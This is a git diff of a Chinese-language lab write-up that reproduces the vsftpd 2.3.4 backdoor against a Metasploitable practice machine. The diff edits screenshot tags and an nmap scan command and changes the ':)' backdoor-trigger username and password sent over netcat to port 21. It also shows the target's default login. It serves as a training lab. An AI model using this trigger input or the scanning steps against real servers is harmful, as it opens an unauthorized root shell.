@@ -38,9 +38,8 @@ vsftpd 2.3.4 版本存在恶意后门，开发者在源码中植入恶意逻辑�
 
 ## 四、实验复现步骤
 
-### 步骤 1：靶机信息收集<img width="372" height="371" alt="屏幕截图 2026-10-30 201942" src="https://github.com/user-attachments/assets/c43d3715-8027-41a2-9e79-d3d6d98a4bc8" />
-<img width="509" height="263" alt="屏幕截图 2026-10-30 195313" src="https://github.com/user-attachments/assets/cddd2aa1-b0f0-42ca-aac5-7eaaf3ba0629" /><img width="385" height="105" alt="屏幕截图 2026-10-30 202228" src="https://github.com/user-attachments/assets/36bc8eba-98af-4557-8350-f602b3515f4d" />
-
+### 步骤 1：靶机信息收集
+<img width="509" height="263" alt="屏幕截图 2026-10-30 195313" src="https://github.com/user-attachments/assets/cddd2aa1-b0f0-42ca-aac5-7eaaf3ba0629" />
 
 
 靶机开机登录，账号密码：`msfadmin / msfadmin`
@@ -55,13 +54,12 @@ ifconfig
 
 ### 步骤 2：Kali 扫描靶机 FTP 版本
 
-使用 Nmap 扫描 21 端口，确认漏洞版本：
+使用 Nmap 扫描 靶机 端口，确认漏洞版本：
 
 ```
-nmap -Pn -sV -p 21 192.168.225.130
+nmap -Pn -sV  192.168.225.130
 ```
 
-扫描结果显示：**vsftpd 2.3.4**，确认存在漏洞。
 <img width="372" height="371" alt="屏幕截图 2026-10-30 201942" src="https://github.com/user-attachments/assets/c43d3715-8027-41a2-9e79-d3d6d98a4bc8" />
 
 
@@ -90,8 +88,8 @@ nc 192.168.225.130 21
 输入恶意用户名触发后门：
 
 ```
-USER root:)
-PASS 123
+USER 155:)
+PASS 666
 ```
 <img width="223" height="79" alt="屏幕截图 2026-10-30 202647" src="https://github.com/user-attachments/assets/bf649358-6722-4e60-87ff-1a1b249ef49c" />
 > 
